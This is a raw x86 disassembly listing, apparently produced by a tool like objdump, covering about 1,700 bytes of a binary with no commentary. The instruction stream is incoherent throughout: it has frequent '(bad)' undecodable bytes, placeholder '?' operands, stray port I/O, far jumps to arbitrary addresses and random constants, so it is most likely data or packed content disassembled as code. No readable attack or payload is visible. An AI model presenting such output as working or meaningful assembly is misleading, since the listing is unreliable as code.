  424f1f:	jp     0x424f63
  424f21:	or     al,0x35
  424f23:	xchg   DWORD PTR [edi+0x6db43f0e],esp
  424f29:	lahf   
  424f2a:	xor    eax,0xdd761d22
  424f2f:	pop    ss
  424f30:	imul   esi,DWORD PTR [esp+ebp*8-0x3f],0x31da7072
  424f38:	sbb    BYTE PTR [ebx],0xab
  424f3b:	mov    ds:0xa85ab3cc,al
  424f40:	xchg   ebx,eax
  424f41:	(bad)  
  424f42:	in     al,0x78
  424f44:	inc    edi
  424f45:	push   0x17
  424f47:	(bad)  
  424f48:	or     ebp,DWORD PTR [ebx-0x61]
  424f4b:	ja     0x424f36
  424f4d:	mov    ds:0x49e6011b,al
  424f52:	mov    ch,0x1e
  424f54:	ins    BYTE PTR es:[edi],dx
  424f55:	aas    
  424f56:	in     al,0x53
  424f58:	shr    BYTE PTR [eax],1
  424f5a:	add    esi,DWORD PTR [edi-0x1]
  424f5d:	test   DWORD PTR [eax+ebp*8],ebx
  424f60:	in     eax,dx
  424f61:	inc    esi
  424f62:	ja     0x424f76
  424f64:	call   0x3055:0x4ff038e4
  424f6b:	add    eax,0x708feb6c
  424f70:	push   ds
  424f71:	sub    bh,ah
  424f73:	xchg   BYTE PTR [ecx],dl
  424f75:	push   eax
  424f76:	cmp    eax,0xba1cb878
  424f7b:	aam    0xfa
  424f7d:	mov    dl,0x2a
  424f7f:	jb     0x424f89
  424f81:	mov    esi,0xfe877858
  424f86:	push   esp
  424f87:	push   edi
  424f88:	dec    ebx
  424f89:	push   ebx
  424f8a:	ror    BYTE PTR [esi+0x44],0x5d
  424f8e:	xor    eax,0xffa1a89e
  424f93:	loop   0x424f58
  424f95:	fmulp  st(7),st
  424f97:	cmp    BYTE PTR [edi-0x43],ch
  424f9a:	cdq    
  424f9b:	retf   0x949a
  424f9e:	idiv   DWORD PTR ss:[ecx-0x76]
  424fa2:	bound  ecx,QWORD PTR [edi-0x7a3c64bc]
  424fa8:	jns    0x42501c
  424faa:	pop    ebx
  424fab:	mov    DWORD PTR [esi],esp
  424fad:	sub    DWORD PTR [ebx],0xf4ce5b29
  424fb3:	inc    edx
  424fb4:	mov    ?,ecx
  424fb6:	in     eax,dx
  424fb7:	outs   dx,DWORD PTR ds:[esi]
  424fb8:	pop    ebx
  424fb9:	aad    0xb6
  424fbb:	ins    DWORD PTR es:[edi],dx
  424fbc:	outs   dx,BYTE PTR ds:[esi]
  424fbd:	fwait
  424fbe:	aam    0xe0
  424fc0:	push   edi
  424fc1:	sub    eax,0x3d6a721e
  424fc6:	sub    eax,0xd7287ba3
  424fcb:	sub    ch,BYTE PTR [edx-0x1e049af5]
  424fd1:	mov    esi,0x9e4fc93b
  424fd6:	into   
  424fd7:	imul   ebx,eax,0xb4acedd5
  424fdd:	adc    eax,0x3a
  424fe0:	pop    edx
  424fe1:	inc    edx
  424fe2:	xchg   esi,eax
  424fe3:	ins    BYTE PTR es:[edi],dx
  424fe4:	pushf  
  424fe5:	sub    ebx,DWORD PTR [edi]
  424fe7:	add    al,0x72
  424fe9:	pop    ds
  424fea:	adc    eax,0x830688a7
  424fef:	jge    0x425016
  424ff1:	sub    DWORD PTR [eax+0x8],edx
  424ff4:	pusha  
  424ff5:	mov    esi,0x19a0f27
  424ffa:	jo     0x42502f
  424ffc:	sbb    DWORD PTR [eax+0x68],eax
  424fff:	cs inc esp
  425001:	dec    esp
  425002:	xor    ah,al
  425004:	out    0x4e,eax
  425006:	mov    edi,DWORD PTR [ebp+0x40]
  425009:	cli    
  42500a:	lods   eax,DWORD PTR ds:[esi]
  42500b:	(bad)  
  42500c:	pop    ss
  42500d:	mov    bl,0xa3
  42500f:	ja     0x424fc7
  425011:	add    BYTE PTR [ebx],ch
  425013:	je     0x425021
  425015:	test   al,0x7b
  425017:	fstp   DWORD PTR [edi]
  425019:	fld    DWORD PTR cs:[ebx]
  42501c:	dec    edi
  42501d:	inc    esi
  42501e:	mov    bl,0xa0
  425020:	inc    ecx
  425021:	jne    0x424ff7
  425023:	ret    
  425024:	loopne 0x424fd8
  425026:	sar    BYTE PTR [ecx-0x2c],0xd3
  42502a:	mov    ebp,0xc7f6ffa2
  42502f:	xor    esp,esi
  425031:	cmp    al,BYTE PTR [ebx-0x143ab08b]
  425037:	adc    DWORD PTR [esi+0x3e61bec3],ebx
  42503d:	push   cs
  42503e:	scas   al,BYTE PTR es:[edi]
  42503f:	inc    esp
  425041:	test   al,0xbb
  425043:	sbb    DWORD PTR [esi],ecx
  425045:	mov    ebp,0x343ec842
  42504a:	dec    edx
  42504b:	push   0xcd61b99b
  425050:	jb     0x42503d
  425052:	repnz mov bh,BYTE PTR [esi+0x343299e9]
  425059:	into   
  42505a:	jle    0x42501b
  42505c:	stos   BYTE PTR es:[edi],al
  42505d:	je     0x425003
  42505f:	xor    eax,esi
  425061:	mov    bh,BYTE PTR [edx-0x12]
  425064:	push   edi
  425065:	jnp    0x425010
  425067:	(bad)  
  425068:	lahf   
  425069:	in     al,0xc6
  42506b:	mov    ds:0x45e97496,al
  425070:	sti    
  425071:	adc    eax,ebp
  425073:	xor    edi,DWORD PTR [edi-0x3e218600]
  425079:	mov    bl,dl
  42507b:	popf   
  42507c:	mov    ?,ebp
  42507e:	retf   0xc932
  425081:	cwde   
  425082:	mov    ebp,0x7219155f
  425087:	push   0x39a408e
  42508c:	in     eax,dx
  42508d:	or     ecx,DWORD PTR [edx+eax*4]
  425090:	jne    0x4250fc
  425092:	imul   esi,DWORD PTR [edi+ebp*8+0x6a],0x72410f97
  42509a:	jbe    0x42511a
  42509c:	push   ebx
  42509d:	mov    ds:0x5786aad1,al
  4250a2:	xrstor [ebp+0x77]
  4250a6:	cmc    
  4250a7:	pop    esi
  4250a8:	(bad)  
  4250a9:	push   ds
  4250aa:	in     al,dx
  4250ab:	inc    ebp
  4250ac:	xchg   edx,eax
  4250ad:	adc    al,0x6a
  4250af:	adc    eax,0x7c4b8378
  4250b4:	pop    ebx
  4250b5:	or     eax,ecx
  4250b7:	mov    ds:0x9c33f86,al
  4250bc:	mov    ebp,0xe206f7f
  4250c1:	sub    al,0x9c
  4250c3:	cmp    ebx,DWORD PTR [edx+0x3144ad55]
  4250c9:	add    di,sp
  4250cc:	dec    ebx
  4250cd:	jg     0x42514d
  4250cf:	add    BYTE PTR [ebp-0x313c6e6e],al
  4250d5:	fisubr DWORD PTR [esi+0x1c2b4334]
  4250db:	inc    esi
  4250dc:	xchg   esp,eax
  4250dd:	mov    edx,0x74e13c4d
  4250e2:	fistp  WORD PTR [ebp-0x3f033e3b]
  4250e8:	dec    ch
  4250ea:	dec    ecx
  4250eb:	cld    
  4250ec:	xchg   ecx,eax
  4250ed:	lods   eax,DWORD PTR ds:[esi]
  4250ee:	cmc    
  4250ef:	xchg   ebp,eax
  4250f0:	outs   dx,BYTE PTR ds:[esi]
  4250f1:	adc    edx,0x17
  4250f4:	jbe    0x425169
  4250f6:	jecxz  0x42514f
  4250f8:	jnp    0x425175
  4250fa:	dec    esp
  4250fb:	in     al,dx
  4250fc:	dec    ecx
  4250fd:	mov    ecx,0xfbeb39e9
  425103:	lahf   
  425104:	or     DWORD PTR [eax+0x46],edx
  425107:	mov    edx,0x287cf775
  42510c:	dec    esi
  42510d:	pop    edi
  42510e:	cmp    DWORD PTR [edi],edx
  425110:	mov    eax,0x2ec4ff42
  425115:	shr    BYTE PTR [esi+0x7080edc8],0xbc
  42511c:	icebp  
  42511d:	leave  
  42511e:	mov    eax,ds:0xe005d675
  425123:	mov    ch,0x99
  425125:	dec    ebx
  425126:	jge    0x42515e
  425128:	inc    esp
  425129:	dec    ebx
  42512a:	adc    ch,BYTE PTR [ecx+0xa]
  42512d:	inc    ebx
  42512e:	aad    0x8
  425130:	sbb    al,0xfa
  425132:	sub    ah,ah
  425134:	data16 and BYTE PTR [eax-0x54],ah
  425138:	scas   eax,DWORD PTR es:[edi]
  425139:	iret   
  42513a:	addr16 fwait
  42513c:	popf   
  42513d:	stc    
  42513e:	pop    edi
  42513f:	addr16 inc ebx
  425141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425142:	jbe    0x42519c
  425144:	mov    ecx,cs
  425146:	or     bl,0x84
  425149:	push   0x43
  42514b:	dec    ebx
  42514c:	(bad)  
  42514d:	loopne 0x4251bb
  42514f:	mov    eax,ds:0xfd60b551
  425154:	pop    esp
  425155:	js     0x4251b6
  425157:	popa   
  425158:	xor    eax,0x8d06e525
  42515d:	sti    
  42515e:	pop    ebx
  42515f:	gs jno 0x42513b
  425162:	jno    0x4251ba
  425164:	call   0x50f5464b
  425169:	xchg   esi,eax
  42516a:	mov    edi,0x23249d78
  42516f:	stc    
  425170:	gs cli 
  425172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425173:	mul    al
  425175:	ret    
  425176:	(bad)  
  425177:	(bad)  
  425178:	add    DWORD PTR [esi],ecx
  42517a:	int    0x60
  42517c:	xor    al,0xa9
  42517e:	inc    ebx
  42517f:	sar    BYTE PTR [esi],0xfe
  425182:	pop    ecx
  425183:	ins    BYTE PTR es:[edi],dx
  425184:	pop    edi
  425185:	push   cs
  425186:	mov    esi,0xac20aae2
  42518b:	cld    
  42518c:	jecxz  0x425124
  42518e:	(bad)  
  42518f:	sbb    ah,bh
  425191:	sbb    ecx,DWORD PTR [ebx+esi*2-0x41]
  425195:	shl    dl,0xb7
  425198:	retf   0xecb2
  42519b:	subps  xmm2,XMMWORD PTR [edi]
  42519e:	pop    esi
  42519f:	in     eax,dx
  4251a0:	test   al,0xa8
  4251a2:	sbb    al,0xcb
  4251a4:	dec    esp
  4251a5:	push   0x8ae85872
  4251aa:	int    0x30
  4251ac:	scas   eax,DWORD PTR es:[edi]
  4251ad:	or     eax,0x42dc44fa
  4251b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251b3:	mov    WORD PTR [eax+0x5a],?
  4251b6:	mov    ah,0x4e
  4251b8:	push   edx
  4251b9:	mov    dl,0x70
  4251bb:	pop    ds
  4251bc:	xlat   BYTE PTR ds:[ebx]
  4251bd:	sar    BYTE PTR [ebp+eax*4-0x5e0a2cb0],cl
  4251c4:	in     eax,0xf6
  4251c6:	mov    esp,0x9cd35e4f
  4251cb:	cmc    
  4251cc:	adc    ch,BYTE PTR [edx-0x29]
  4251cf:	mov    edx,0x5b9903f4
  4251d4:	fwait
  4251d5:	in     eax,0x99
  4251d7:	sar    DWORD PTR [ebx+0x1a],cl
  4251da:	outs   dx,DWORD PTR fs:[esi]
  4251dc:	xor    bh,BYTE PTR [ebp-0x57]
  4251df:	test   eax,0x9f9af20a
  4251e4:	ins    BYTE PTR es:[edi],dx
  4251e5:	cmp    ch,BYTE PTR [edi]
  4251e7:	jmp    0x2df2507f
  4251ec:	push   DWORD PTR [edx]
  4251ee:	mov    esi,0xeef014f2
  4251f3:	nop
  4251f4:	ss pop edx
  4251f6:	push   0x2c
  4251f8:	mov    edx,0x276449da
  4251fd:	pop    cx
  4251ff:	push   esi
  425200:	jle    0x425223
  425202:	push   ss
  425203:	lea    ecx,[ebp-0xc]
  425206:	imul   ebx,edi,0x4c
  425209:	push   eax
  42520a:	js     0x42521a
  42520c:	idiv   DWORD PTR [eax]
  42520e:	aam    0x1a
  425210:	call   0x73496bbc
  425215:	mov    ds:0x25b0c46f,al
  42521a:	dec    ecx
  42521b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42521c:	fdiv   QWORD PTR [eax+0x77]
  42521f:	ds inc edi
  425221:	adc    cl,BYTE PTR [edx-0x14]
  425224:	pusha  
  425225:	sbb    ch,BYTE PTR [ebx-0x43946f93]
  42522b:	repnz pop es
  42522d:	push   0x27
  42522f:	xor    ch,al
  425231:	add    esp,DWORD PTR [ebx+ebx*8+0x7ed1981f]
  425238:	xchg   ebp,eax
  425239:	enter  0x90fb,0x6d
  42523d:	jmp    0x9b2c:0xf54b77ab
  425244:	neg    BYTE PTR [esi+0x45389015]
  42524a:	and    eax,0xe5631e60
  42524f:	sub    DWORD PTR [edi-0x79],ebp
  425252:	inc    ebp
  425253:	xchg   ebp,eax
  425254:	lock dec esp
  425256:	int3   
  425257:	fild   DWORD PTR [esi]
  425259:	add    ah,BYTE PTR [esi+0x6e]
  42525c:	arpl   WORD PTR [ecx],bp
  42525e:	into   
  42525f:	add    ebx,DWORD PTR [ebx]
  425261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425262:	pushf  
  425263:	test   al,0x42
  425265:	jns    0x425209
  425267:	fistp  QWORD PTR cs:[edx-0x3]
  42526b:	pop    esi
  42526c:	push   0x64c9f7a
  425271:	stos   BYTE PTR es:[edi],al
  425272:	cmp    esi,esp
  425274:	lock mov cl,0x86
  425277:	imul   ebx,eax,0xf
  42527a:	(bad)  
  42527c:	inc    edx
  42527d:	or     ebp,DWORD PTR [esi]
  42527f:	inc    bh
  425281:	jo     0x425277
  425283:	mov    ds:0xf348c722,al
  425288:	out    0xed,al
  42528a:	mov    BYTE PTR [ebx+0x20],ah
  42528d:	(bad)  
  42528e:	ds adc ah,bl
  425291:	fimul  DWORD PTR [eax-0x482ba1fe]
  425297:	inc    esi
  425298:	or     al,0x74
  42529a:	cld    
  42529b:	(bad)  
  42529c:	retf   
  42529d:	rcl    DWORD PTR [edx-0x6d15a995],cl
  4252a3:	cld    
  4252a4:	iret   
  4252a5:	xchg   DWORD PTR [edi],eax
  4252a7:	(bad)  
  4252a8:	rcr    DWORD PTR [bx-0x38d5],cl
  4252ad:	push   edi
  4252ae:	xor    edi,DWORD PTR [edx+0x10322461]
  4252b4:	jbe    0x4252b5
  4252b6:	xchg   ebx,eax
  4252b7:	int3   
  4252b8:	mov    esi,0x44a6fdae
  4252bd:	pop    esi
  4252be:	or     BYTE PTR [edi],0x8f
  4252c1:	in     eax,dx
  4252c2:	std    
  4252c3:	popf   
  4252c4:	pop    ebp
  4252c5:	fcmovb st,st(1)
  4252c7:	in     al,dx
  4252c8:	push   cs
  4252c9:	fidivr DWORD PTR ds:0xbae31de5
  4252cf:	push   cs
  4252d0:	pop    ecx
  4252d1:	add    bl,bh
  4252d3:	mov    eax,eax
  4252d5:	(bad)  
  4252d6:	cld    
  4252d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252d8:	adc    eax,0xe3dcc6b0
  4252dd:	push   esi
  4252de:	je     0x4252e7
  4252e0:	addr16 cld 
  4252e2:	call   0xe202a4fd
  4252e7:	push   es
  4252e8:	mov    ebx,0xf802bc21
  4252ed:	int    0xc5
  4252ef:	(bad)  
  4252f0:	scas   eax,DWORD PTR es:[edi]
  4252f1:	jmp    0xf9fb4d98
  4252f6:	popf   
  4252f7:	mov    WORD PTR cs:[edi+0xb],ss
  4252fb:	jno    0x425347
  4252fd:	sub    BYTE PTR [edx],cl
  4252ff:	xchg   esi,eax
  425300:	cwde   
  425301:	sar    BYTE PTR [eax+0x5f199a59],1
  425307:	or     DWORD PTR [edi],ebx
  425309:	mov    ebx,0x5af37908
  42530e:	enter  0xe879,0x44
  425312:	out    0x38,al
  425314:	and    al,0xe6
  425316:	xchg   ebp,eax
  425317:	inc    ebx
  425318:	add    eax,0x10d03ef2
  42531d:	test   eax,0x44a8d46a
  425322:	fnstenv ds:0x1e45440
  425328:	adc    ecx,0xeb96ab50
  42532e:	loop   0x4252f0
  425330:	xor    al,0x45
  425332:	fist   WORD PTR [edi-0x7c]
  425335:	jo     0x4252c3
  425337:	mov    esp,0x7c798dda
  42533c:	dec    edx
  42533d:	fwait
  42533e:	adc    ch,BYTE PTR [ebx+0x1]
  425341:	push   ecx
  425342:	push   esi
  425343:	and    DWORD PTR [ebx+eiz*8+0x6f],edi
  425347:	jns    0x4252ea
  425349:	je     0x425370
  42534b:	push   ds
  42534c:	push   ss
  42534d:	hlt    
  42534e:	push   eax
  42534f:	shl    edi,1
  425351:	test   BYTE PTR [ebx],dh
  425353:	pop    eax
  425354:	push   0xffffffda
  425356:	jmp    0xd5eaf87f
  42535b:	add    eax,0x7868dfa
  425360:	mov    BYTE PTR [ebx-0x311418d1],0x85
  425367:	js     0x4253aa
  425369:	lea    ecx,[ebp+0x6d]
  42536c:	test   BYTE PTR [eax],dl
  42536e:	jg     0x42530a
  425370:	jecxz  0x42538a
  425372:	popa   
  425373:	pop    ss
  425374:	dec    edi
  425375:	das    
  425376:	addr16 push 0xd2cade74
  42537c:	ror    ch,cl
  42537e:	jo     0x4253c1
  425380:	mov    ecx,0xc95dfe42
  425385:	jmp    0xbbac5c23
  42538a:	inc    edx
  42538b:	pushf  
  42538c:	jns    0x4253ec
  42538e:	push   0xffffff84
  425390:	jns    0x425355
  425392:	arpl   WORD PTR [edi],di
  425394:	or     ecx,eax
  425396:	mov    ds:0xa6a302f0,al
  42539b:	adc    bl,BYTE PTR [edi+0x34]
  42539e:	jg     0x425354
  4253a0:	mov    BYTE PTR [ebp-0x16],ah
  4253a3:	(bad)  
  4253a5:	retf   0xed13
  4253a8:	or     eax,0xb68fa0aa
  4253ad:	sub    al,0x1a
  4253af:	loopne 0x4253aa
  4253b1:	cwde   
  4253b2:	pop    edi
  4253b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253b4:	sbb    eax,0xed72e851
  4253b9:	leave  
  4253ba:	jmp    0x62842a4a
  4253bf:	mov    esi,0xacfabe73
  4253c4:	lods   ax,WORD PTR ds:[esi]
  4253c6:	(bad)  
  4253c7:	bound  edi,QWORD PTR [ebx+0xf]
  4253ca:	mov    ebx,ds
  4253cc:	cmc    
  4253cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253ce:	outs   dx,BYTE PTR ds:[esi]
  4253cf:	pop    es
  4253d0:	in     eax,0xf7
  4253d2:	and    eax,0xf57ce666
  4253d7:	mov    ebp,0x3185d4dc
  4253dc:	cs xor al,0x85
  4253df:	scas   al,BYTE PTR es:[edi]
  4253e0:	dec    ecx
  4253e1:	sub    DWORD PTR [edx],ebx
  4253e3:	push   0xffffffbe
  4253e5:	shl    esp,cl
  4253e7:	inc    eax
  4253e8:	push   eax
  4253e9:	push   edx
  4253ea:	adc    ah,BYTE PTR [ebp-0x5e953bf1]
  4253f0:	mov    ebp,0x7f67116d
  4253f5:	inc    esp
  4253f6:	pop    eax
  4253f7:	cmp    DWORD PTR [edi-0x1e],0x28
  4253fb:	shl    DWORD PTR [esi+0x19],1
  4253fe:	mov    esi,0x569c6580
  425403:	ret    0x824
  425406:	idiv   DWORD PTR [edi]
  425408:	mov    esp,0x7f85a39d
  42540d:	xor    eax,0x656dc232
  425412:	fbld   TBYTE PTR ds:0xf8efae0f
  425418:	int3   
  425419:	mov    ebx,edx
  42541b:	jae    0x425411
  42541d:	sub    eax,0xf66d2589
  425422:	scas   al,BYTE PTR es:[edi]
  425423:	jg     0x42542f
  425425:	xchg   edi,eax
  425426:	push   ebp
  425427:	dec    ebp
  425428:	pop    ss
  425429:	xchg   esp,eax
  42542a:	and    eax,0xa2c71810
  42542f:	xor    bl,0x88
  425432:	sub    bh,BYTE PTR [ecx-0x643f9df4]
  425438:	imul   DWORD PTR [edi]
  42543a:	stos   DWORD PTR es:[edi],eax
  42543b:	leave  
  42543c:	mov    eax,0xc04eb261
  425441:	cmp    al,0xea
  425443:	repnz (bad) 
  425445:	repnz (bad) 
  425447:	mov    esp,0xa698c3b4
  42544c:	jns    0x425467
  42544e:	loop   0x4254b4
  425450:	dec    ecx
  425451:	and    ebp,DWORD PTR [edi+0x78a4248b]
  425457:	imul   DWORD PTR [edx-0xa626ca6]
  42545d:	jns    0x425454
  42545f:	xchg   esi,eax
  425460:	jp     0x4254b8
  425462:	icebp  
  425463:	add    ecx,DWORD PTR [ebx*2-0x2be5e39f]
  42546a:	in     eax,dx
  42546b:	aam    0x9c
  42546d:	stos   BYTE PTR es:[edi],al
  42546e:	aas    
  42546f:	or     BYTE PTR [eax+0x75],cl
  425472:	mov    WORD PTR [ecx+0x28d4ca27],?
  425478:	push   ecx
  425479:	inc    ebp
  42547a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42547b:	xor    dh,0xa3
  42547e:	call   0x401b64b0
  425483:	das    
  425484:	mov    esi,0x56a199ee
  425489:	es out 0xfa,eax
  42548c:	xor    esp,DWORD PTR [esi+0x60]
  42548f:	js     0x425507
  425491:	jg     0x425416
  425493:	dec    esp
  425494:	js     0x4254a0
  425496:	sbb    eax,0xaaf83eba
  42549b:	mov    al,0xea
  42549d:	add    DWORD PTR [edx-0x12],esi
  4254a0:	(bad)  
  4254a1:	sti    
  4254a2:	jmp    0x8b059673
  4254a7:	push   esp
  4254a8:	icebp  
  4254a9:	sub    dh,cl
  4254ab:	retf   
  4254ac:	js     0x425462
  4254ae:	sbb    ah,BYTE PTR [ecx-0x4d]
  4254b1:	popa   
  4254b2:	jno    0x4254f1
  4254b4:	scas   eax,DWORD PTR es:[edi]
  4254b5:	sar    BYTE PTR [esi+0x72],cl
  4254b8:	js     0x42543d
  4254ba:	dec    eax
  4254bb:	(bad)  
  4254bc:	mul    eax
  4254be:	data16 rcr BYTE PTR [edi],0x11
  4254c2:	push   ebp
  4254c3:	sbb    dl,ah
  4254c5:	push   ds
  4254c6:	int    0xe2
  4254c8:	jmp    0xe34de4ab
  4254cd:	in     al,0xdb
  4254cf:	adc    DWORD PTR ds:0x71c4aff8,0xffffffad
  4254d6:	sub    BYTE PTR [ebp+0x3a127eec],cl
  4254dc:	lahf   
  4254dd:	xchg   esp,eax
  4254de:	adc    ah,bh
  4254e0:	stos   DWORD PTR es:[edi],eax
  4254e1:	les    edi,FWORD PTR [edi+0x1a]
  4254e4:	push   es
  4254e5:	enter  0x65d3,0x42
  4254e9:	pop    esp
  4254ea:	mov    eax,0x52c59250
  4254ef:	push   0x60f362e6
  4254f4:	pop    ebx
  4254f5:	out    dx,al
  4254f6:	popf   
  4254f7:	add    edx,ebx
  4254f9:	fsub   QWORD PTR [edi-0x37]
  4254fc:	ja     0x42556d
  4254fe:	popf   
  4254ff:	test   DWORD PTR [esi],ebp
  425501:	call   0x5cc4:0x6e1660d7
  425508:	shl    DWORD PTR [esi-0x6a],cl
  42550b:	daa    
  42550c:	lahf   
  42550d:	stos   DWORD PTR es:[edi],eax
  42550e:	mov    edx,DWORD PTR [ecx]
  425510:	or     BYTE PTR [ebx+0x40dfb39d],dl
  425516:	lea    edx,[eax]
  425518:	arpl   WORD PTR [eax+0x9bc74ba],bx
  42551e:	(bad)  
  42551f:	loop   0x425528
  425521:	pusha  
  425522:	lods   eax,DWORD PTR ds:[esi]
  425523:	cmc    
  425524:	fmulp  st(7),st
  425526:	add    ebx,ebx
  425528:	scas   eax,DWORD PTR es:[edi]
  425529:	cmc    
  42552a:	cmp    eax,eax
  42552c:	xchg   esp,eax
  42552d:	jno    0x425566
  42552f:	jle    0x4254db
  425531:	shr    DWORD PTR [di-0x5f],0x48
  425536:	mov    ebx,0x193ceb7b
  42553b:	lods   al,BYTE PTR ds:[esi]
  42553c:	hlt    
  42553d:	pop    esi
  42553e:	jne    0x42556f
  425540:	mov    dh,0x9b
  425542:	cmp    DWORD PTR [ebx+0x376f6be],esp
  425548:	out    0x4a,al
  42554a:	add    al,0xc1
  42554c:	adc    DWORD PTR [edx+0x7b],ebx
  42554f:	inc    esp
  425550:	sbb    bh,BYTE PTR fs:[ebp-0x49]
  425554:	cmp    BYTE PTR [eax],bh
  425556:	xor    al,0xdd
  425558:	jle    0x42554c
  42555a:	das    
  42555b:	lods   al,BYTE PTR ds:[esi]
  42555c:	mov    bh,0xc5
  42555e:	loop   0x42551b
  425560:	push   ss
  425561:	jo     0x425578
  425563:	test   eax,0xd92a99af
  425568:	ror    BYTE PTR [ecx+0x49],1
  42556b:	imul   eax,DWORD PTR [ebx],0xffffffa3
  42556e:	pusha  
  42556f:	ds popf 
  425571:	adc    BYTE PTR [esp+eax*4+0x6dc7ddf4],ch
  425578:	ins    DWORD PTR es:[edi],dx
  425579:	adc    BYTE PTR [ecx+0x47b8e978],bl
  42557f:	call   0xdc41302
  425584:	and    eax,0x42c2e71e
  425589:	jle    0x42551d
  42558b:	xchg   esp,eax
  42558c:	inc    edi
  42558d:	dec    esi
  42558e:	fcom   DWORD PTR [ecx-0x72]
  425591:	fwait
  425592:	mov    ds:0x83a5398c,al
  425597:	pop    ds
  425598:	rcr    DWORD PTR [edi],1
  42559a:	sub    al,0xb3
  42559c:	dec    ecx
  42559d:	scas   eax,DWORD PTR es:[edi]
  42559e:	fist   WORD PTR [esi+eiz*8-0x49]
  4255a2:	or     edx,DWORD PTR [eax-0x1a]
  4255a5:	test   eax,0x721e2cf9
  4255aa:	mov    eax,ds:0x6ca2e469
  4255af:	jge    0x42560a
  4255b1:	mov    al,ds:0x5f876275
  4255b6:	pop    ds
  4255b7:	xor    DWORD PTR [esi],ebp
  4255b9:	lods   eax,DWORD PTR ds:[esi]
  4255ba:	test   eax,0x59ca3741
  4255bf:	push   eax
  4255c0:	cli    
  4255c1:	stos   BYTE PTR es:[edi],al
  4255c2:	(bad)  
  4255c3:	xor    cl,BYTE PTR [ebx+0x382fdf50]
  4255c9:	fdiv   DWORD PTR [edx+eiz*4+0x7cf1e344]
  4255d0:	push   ebx
  4255d1:	cmp    esi,esi
  4255d3:	cmp    eax,0x7cd4de6f
  4255d8:	test   BYTE PTR [esp+eiz*4],dh
  4255db:	xchg   dx,ax
  4255dd:	jl     0x425598
  4255df:	add    BYTE PTR [ebp+0x3b502082],dh
  4255e5:	(bad)  
  4255e6:	pop    ebx
  4255e7:	mov    eax,0x8b40eb97
  4255ec:	jp     0x425616
  4255ee:	lods   al,BYTE PTR ds:[esi]
  4255ef:	aas    
  4255f0:	or     dl,BYTE PTR [edx]
  4255f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255f3:	jns    0x4255e1
  4255f5:	aad    0xc2
  4255f7:	pop    es
  4255f8:	adc    al,BYTE PTR ds:0x263f457c
  4255fe:	add    bl,ah
  425600:	push   esi
  425601:	loope  0x42558d
  425603:	(bad)  
  425604:	ins    BYTE PTR es:[edi],dx
  425605:	test   BYTE PTR [ebx-0x77],0x6d
  425609:	mov    cl,0xc8
  42560b:	int    0x1a
  42560d:	ret    
  42560e:	mov    al,0x9d
  425610:	and    DWORD PTR [esi-0x42],0x47a21774
  425617:	mov    ecx,DWORD PTR [edx-0x5c683ee7]
  42561d:	sar    DWORD PTR [ebp-0x2a],1
  425620:	gs push si
  425623:	mov    ah,0x21
  425625:	cdq    
  425626:	and    eax,0x9dd4ee78
  42562b:	sbb    BYTE PTR [edi+ebx*8+0x47dfe335],bh
  425632:	push   ebp
  425633:	lea    eax,[esi-0x2ff61153]
  425639:	inc    edi
  42563a:	js     0x42563a
  42563c:	ja     0x425680
  42563e:	sub    al,0x81
  425640:	ret    
  425641:	iret   
  425642:	pop    esi
  425643:	out    0x12,eax
  425645:	nop
  425646:	mov    dl,0xfa
  425648:	cmp    DWORD PTR [esi+0xfbd26ce],eax
  42564e:	pop    esp
  42564f:	outs   dx,DWORD PTR ds:[esi]
  425650:	xchg   DWORD PTR [esi+0x10],ebp
  425653:	xchg   edi,eax
  425654:	push   edx
  425655:	mov    bh,0xde
  425657:	jecxz  0x4255ee
  425659:	xchg   ebx,eax
  42565a:	shl    DWORD PTR ss:[ebx+0x5f01791d],1
  425661:	in     eax,0x1c
  425663:	neg    BYTE PTR [edx]
  425665:	lea    edx,[eax+0x44]
  425668:	mov    ah,0x8
  42566a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42566b:	push   esp
  42566c:	fsubr  DWORD PTR [ebp+0x41]
  42566f:	or     eax,0x3d45938c
  425674:	xchg   edi,eax
  425675:	xlat   BYTE PTR ds:[ebx]
  425676:	add    al,cl
  425678:	sahf   
  425679:	xor    al,0x14
  42567b:	pop    ecx
  42567c:	add    ebp,DWORD PTR [ebx]
  42567e:	iret   
  42567f:	and    BYTE PTR [esp+edx*8-0x17ce9220],0xc5
  425687:	nop
  425688:	mov    al,0x27
  42568a:	or     al,0xb3
  42568c:	sub    al,BYTE PTR [edi]
  42568e:	loope  0x425679
  425690:	into   
  425691:	jle    0x425619
  425693:	jnp    0x42565e
  425695:	cmp    al,0xa3
  425697:	hlt    
  425698:	xchg   ebx,eax
  425699:	or     dl,BYTE PTR [eax]
  42569b:	jno    0x42566a
  42569d:	stos   BYTE PTR es:[edi],al
  42569e:	jns    0x42566c
  4256a0:	push   es
  4256a1:	test   BYTE PTR [edx+0x55da8179],ah
  4256a7:	xchg   ebx,eax
  4256a8:	out    0x9e,eax
  4256aa:	push   0xabe6523b
  4256af:	fucomp st(2)
  4256b1:	add    al,BYTE PTR [esi+0x3fa30c41]
  4256b7:	in     al,dx
  4256b8:	fwait
  4256b9:	sahf   
  4256ba:	xchg   esi,eax
  4256bb:	pop    edi
  4256bc:	rcl    BYTE PTR [ecx-0x5943a32c],0x30
  4256c3:	ins    BYTE PTR es:[edi],dx
  4256c4:	out    0xfe,eax
  4256c6:	pop    ebx
  4256c7:	loop   0x42567f
  4256c9:	loopne 0x4256eb
  4256cb:	imul   ebp,DWORD PTR [ebp+0x1831004b],0xfffffffc
  4256d2:	pop    esp
  4256d3:	aaa    
  4256d4:	jo     0x425731
  4256d6:	dec    eax
  4256d7:	outs   dx,BYTE PTR ds:[esi]
  4256d8:	(bad)  
  4256d9:	jnp    0x425665
  4256db:	pop    esi
  4256dc:	sub    DWORD PTR [eax],edi
  4256de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256df:	inc    ebp
  4256e0:	pop    ds
  4256e1:	das    
  4256e2:	xor    eax,0x915420e8
